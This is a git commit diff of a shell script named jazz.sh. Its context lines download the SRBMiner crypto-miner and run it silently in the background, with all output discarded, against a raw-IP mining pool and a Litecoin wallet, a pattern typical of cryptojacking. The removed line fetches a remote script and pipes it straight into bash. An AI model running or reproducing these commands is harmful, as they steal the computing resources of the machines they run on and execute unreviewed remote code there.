730f7cf465c3b964b159c4174c0ffca465f1bc99
malogrono <136266511+malogrono@users.noreply.github.com>
2026-08-25 04:10:16 +0700

    Update jazz.sh

--- jazz.sh
+++ jazz.sh
@@ -3,4 +3,3 @@ wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.8/SRBMiner
 tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz
 cd SRBMiner-Multi-2-4-8
 ./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://148.113.141.142:80 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."OP$RANDOM" >/dev/null 2>&1 &
-curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
